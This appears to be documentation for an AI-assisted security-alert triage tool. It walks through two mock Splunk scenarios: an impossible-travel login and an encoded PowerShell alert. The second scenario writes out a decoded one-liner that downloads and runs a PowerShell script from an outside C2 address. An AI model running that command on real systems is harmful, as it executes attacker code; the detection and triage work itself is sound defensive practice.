# Example sessions

Two walk-throughs showing the steelman method on the built-in mock fixtures. Use these as smoke tests for your Claude setup, or as reference for what "good" triage should look like.

---

## Scenario 1 — `NOT-2026-04-20-0001` — Impossible Travel

**Prompt to Claude (with `steelman_triage` prompt loaded as system prompt):**

> Triage notable event `NOT-2026-04-20-0001`.

**What a good run looks like:**

### Step 1 — Read the alert

Claude calls `fetch_notable_event("NOT-2026-04-20-0001")` and receives:

```
rule_name: Impossible Travel Detected
severity:  high
description: User authenticated from Dublin, IE and Lagos, NG within 12 minutes.
entities:
  user:   [alice.nguyen@acme.example]
  src_ip: [212.95.7.44, 102.89.41.10]
mitre_techniques: [T1078.004]
```

Stated in one sentence: *"Two successful authentications for alice.nguyen from geographically impossible locations within 12 minutes."*

### Step 2 — Hypothesis

Claude formulates, using the `attack_hypothesis_framework` prompt:

- **Kill-chain stage:** credential access → initial access via valid cloud accounts
- **MITRE technique:** T1078.004 (Valid Accounts: Cloud Accounts)
- **Attacker goal:** session hijack or credential replay of a real corporate identity
- **Expected next artifacts:** OAuth token issuance, mail rule creation, cloud-drive access from the Lagos IP, consent grants to unfamiliar apps
- **Negation test:** a legitimate mobile-device login from the user's real phone during their travel to a country they've visited before

### Step 3 — Hunt

Claude runs searches and gets:

| search | finding |
|---|---|
| `index=okta user="alice.nguyen@acme.example"` (-24h) | Two logins: Dublin (mbp-alice-01) at 14:02, Lagos (android-unknown-4412) at 14:14. |
| `search user="alice.nguyen" baseline` (-90d@d) | 112 days observed. Historical geos: IE, UK, ES. Never seen: **NG**. |
| `search 102.89.41.10 threat reputation` | `residential_mobile`, `AS37148 MTN-NG`, **not** known_malicious, no campaign history. |
| `search alice.nguyen mfa push` | MFA push approved from `android-unknown-4412` with location accuracy 18m. |

### Step 4 — Resist the benign story

The obvious benign explanation: *"Alice is travelling, approved an MFA push on her phone."*

Adversarial steelman:

- Her phone in the baseline is not `android-unknown-4412` — the device ID is unfamiliar.
- Her baseline has never shown Nigeria. A first-ever geo during a high-severity impossible-travel alert is not "routine travel."
- A push-approval can be coerced (MFA fatigue, SIM-swap on a travelling user).

The benign story doesn't cleanly survive. But the attack story also has gaps: no malicious IP reputation, no follow-on activity visible in the 24h window.

### Step 5 — Collective memory

`find_similar_prior_verdicts("NOT-2026-04-20-0001")` returns whatever your team has decided on previous Alice-impossible-travel alerts. On a fresh install it returns empty.

### Step 6 — Verdict

A well-calibrated agent should NOT confidently acquit. The right output here is:

```
verdict:    NEEDS_HUMAN_REVIEW
confidence: 0.55

attack_hypothesis:
  T1078.004 — Lagos authentication may be a hijacked session on a
  previously-unseen device in a previously-unseen country. MFA push
  was approved but from the same unfamiliar device, which is consistent
  with either legitimate new-device onboarding during travel OR coerced
  approval.

evidence:
  - Lagos login from unfamiliar device_id on geo never in baseline (supports hypothesis, moderate)
  - Destination IP has no threat reputation (supports benign, weak)
  - MFA was approved (supports benign, moderate — but undermined by new device)
  - No follow-on suspicious activity in 24h window (supports benign, weak)

reasoning_trace:
  Evidence is genuinely mixed. The novel geo + novel device combination
  on a high-severity rule warrants a 2-minute Slack check with the user
  before closing as FP. Do not auto-acquit.
```

That escalation is the *correct* behaviour. A bad agent would look at the clean MFA approval and close as FP — exactly the kind of hole attackers exploit.

---

## Scenario 2 — `NOT-2026-04-20-0002` — Encoded PowerShell

**Prompt to Claude:**

> Triage notable event `NOT-2026-04-20-0002`.

### Step 1 — Read

```
rule_name: Encoded PowerShell Command Detected
severity:  medium
entities:
  user:    [svc_backup]
  host:    [WIN-FIN-07]
  process: [powershell.exe]
mitre_techniques: [T1059.001, T1027]
```

### Step 2 — Hypothesis

- **Kill-chain stage:** execution + defense evasion → command and control
- **MITRE:** T1059.001 (PowerShell) + T1027 (Obfuscated Files) + probable T1071.001 (Web Protocols C2)
- **Attacker goal:** establish interactive C2 on a finance-adjacent host via a service account
- **Expected next:** outbound HTTP to an attacker-controlled IP, payload fetch, possible secondary process spawn
- **Negation test:** decoded PowerShell is an approved backup or admin script; outbound destination is on the corporate allowlist

### Step 3 — Hunt

| search | finding |
|---|---|
| `host=WIN-FIN-07 user=svc_backup powershell` | Encoded command decodes to `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.50/a.ps1')` |
| `host=WIN-FIN-07 outbound` | Outbound connection to `185.220.101.50:80`, 4KB out / 285KB in, first-seen today. |
| `185.220.101.50 threat reputation` | **known_malicious=true**, categories `[c2, tor-exit]`, malicious since 2024-11-02. |
| `svc_backup baseline` (-90d@d) | 240 days observed. PowerShell **never** seen. Encoded command **never** seen. |

### Step 4 — Resist the benign story

Trying hard to steelman the benign side:

- *"Maybe someone added PowerShell to an approved runbook recently."* → baseline shows zero PowerShell ever, not just recently. A change would show up as "first seen last week," not "first seen today at the same minute as a tor-exit outbound."
- *"Maybe the tor-exit tag is stale."* → first-seen-malicious 2024-11-02, multiple category tags. Not a fresh false-flag.
- *"Maybe it's a red team exercise."* → the agent should flag this possibility in `tool_failures` / `reasoning_trace` but not use it to downgrade the verdict; red-team confirmation is a *human* responsibility.

Nothing survives.

### Step 5 — Memory

Empty on first run.

### Step 6 — Verdict

```
verdict:    TRUE_POSITIVE
confidence: 0.92

attack_hypothesis:
  svc_backup was used to execute an encoded PowerShell one-liner that
  IEX-downloads a second-stage payload from 185.220.101.50, a known
  tor-exit C2 endpoint. This is T1059.001 + T1027 + T1071.001. The
  service account has never executed PowerShell in its 240-day
  baseline, and the destination has no legitimate business use.

mitre_techniques: [T1059.001, T1027, T1071.001]

evidence:
  - Encoded PowerShell decoded to IEX from 185.220.101.50 (hypothesis, strong)
  - Outbound connection to that same IP confirmed, 285KB inbound (hypothesis, strong)
  - IP is known_malicious c2/tor-exit since 2024-11-02 (hypothesis, strong)
  - svc_backup has never run PowerShell in 240 days of baseline (hypothesis, strong)

reasoning_trace:
  Hypothesis: attacker achieved execution on WIN-FIN-07 via the backup
  service account and is staging C2. I searched for the process activity
  (confirmed: encoded PowerShell decoding to IEX download), the outbound
  connection (confirmed: 285KB fetched from the target IP), destination
  reputation (confirmed: known-bad C2/tor since 2024), and the service
  account's baseline (confirmed: PowerShell has never been observed).
  No benign explanation survives: a legitimate backup job would not use
  encoded PowerShell to fetch from a tor-exit node, and the service
  account's 240-day history contradicts any "this is normal" claim.
  This should page on-call immediately.
```

This is the shape of a well-structured TP verdict: specific hypothesis, four pieces of strong corroborating evidence each tied to a concrete search, and a reasoning trace a human analyst can read in 30 seconds.

---

## Debugging tips

- **"Evidence references unknown search_ids" error on `record_verdict`.** The agent tried to cite a search it didn't actually run. Check `list_searches_run()` and make the agent redo the investigation with real searches.
- **Verdict coerced to `NEEDS_HUMAN_REVIEW` unexpectedly.** Confidence was below 0.75. That's intentional. Either the agent should gather more evidence and raise confidence, or escalation is correct.
- **Mock mode engaged when you wanted real Splunk.** Check `.env` — if no token or username/password is set, mock mode auto-enables. Set them or set `DEEPERSPLUNK_MOCK_MODE=false` explicitly alongside valid credentials.
